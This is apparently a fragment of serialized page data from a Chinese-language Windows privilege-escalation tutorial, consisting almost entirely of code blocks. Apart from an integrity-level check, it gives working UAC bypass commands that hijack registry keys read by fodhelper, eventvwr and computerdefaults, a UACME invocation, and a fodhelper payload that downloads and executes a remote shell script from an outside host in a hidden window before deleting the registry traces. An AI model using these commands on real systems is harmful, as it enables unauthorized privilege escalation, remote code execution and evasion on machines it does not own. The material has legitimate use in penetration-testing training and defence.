2e:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":"# 查看当前进程完整性级别\nwhoami /groups | findstr \"Mandatory\"\n\n# 使用 Process Explorer 查看进程令牌和完整性级别\n# 或使用 PowerShell\n(Get-Process -Id $PID).StartInfo\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-powershell","children":"# 查看当前进程完整性级别\nwhoami /groups | findstr \"Mandatory\"\n\n# 使用 Process Explorer 查看进程令牌和完整性级别\n# 或使用 PowerShell\n(Get-Process -Id $PID).StartInfo\n"}]}]]}]
2f:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":"# 方法一：PowerShell 实现 fodhelper UAC 绕过\n# 创建注册表项\nNew-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(Default)\" -Value \"cmd.exe /c powershell.exe -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/shell.ps1')\" -Force\n\n# 触发 fodhelper\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden\n\n# 清理注册表\nRemove-Item \"HKCU:\\Software\\Classes\\ms-settings\\\" -Recurse -Force\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-powershell","children":"# 方法一：PowerShell 实现 fodhelper UAC 绕过\n# 创建注册表项\nNew-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(Default)\" -Value \"cmd.exe /c powershell.exe -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/shell.ps1')\" -Force\n\n# 触发 fodhelper\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden\n\n# 清理注册表\nRemove-Item \"HKCU:\\Software\\Classes\\ms-settings\\\" -Recurse -Force\n"}]}]]}]
30:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":"# eventvwr.exe UAC 绕过\nNew-Item \"HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\" -Name \"(Default)\" -Value \"cmd.exe /c start powershell.exe\" -Force\n\n# 触发\nStart-Process \"C:\\Windows\\System32\\eventvwr.exe\"\n\n# 清理\nRemove-Item \"HKCU:\\Software\\Classes\\mscfile\" -Recurse -Force\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-powershell","children":"# eventvwr.exe UAC 绕过\nNew-Item \"HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\" -Name \"(Default)\" -Value \"cmd.exe /c start powershell.exe\" -Force\n\n# 触发\nStart-Process \"C:\\Windows\\System32\\eventvwr.exe\"\n\n# 清理\nRemove-Item \"HKCU:\\Software\\Classes\\mscfile\" -Recurse -Force\n"}]}]]}]
32:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L60",null,{"text":":: 使用 UACME 工具（集成了大量 UAC 绕过方法）\n:: https://github.com/hfiref0x/UACME\nAkagi64.exe 23 C:\\Windows\\System32\\cmd.exe\n\n:: computerdefaults.exe 绕过\nreg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /d \"cmd.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v \"DelegateExecute\" /f\ncomputerdefaults.exe\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-cmd","children":":: 使用 UACME 工具（集成了大量 UAC 绕过方法）\n:: https://github.com/hfiref0x/UACME\nAkagi64.exe 23 C:\\Windows\\System32\\cmd.exe\n\n:: computerdefaults.exe 绕过\nreg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /d \"cmd.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v \"DelegateExecute\" /f\ncomputerdefaults.exe\n"}]}]]}]
